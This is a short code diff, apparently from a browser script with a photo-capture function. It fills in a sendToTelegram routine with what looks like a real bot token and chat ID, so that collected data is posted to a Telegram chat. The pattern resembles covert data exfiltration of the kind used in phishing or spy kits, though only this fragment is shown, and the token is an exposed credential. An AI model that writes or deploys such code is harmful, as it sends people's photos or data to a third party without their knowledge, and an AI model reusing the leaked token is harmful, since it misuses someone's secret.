@@ -62,11 +62,11 @@ async function capturePhoto() {
 }
 
 async function sendToTelegram(data) {
-    const response = await fetch('https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage', {
+    const response = await fetch('https://api.telegram.org/bot8761461166:AAGJSUvTctDDs0j7kKCIC-gY-7cc2WMnYvM/sendMessage', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-            chat_id: 'YOUR_CHAT_ID',
+            chat_id: '6866229974',
             text: JSON.stringify(data, null, 2)
         })
     });
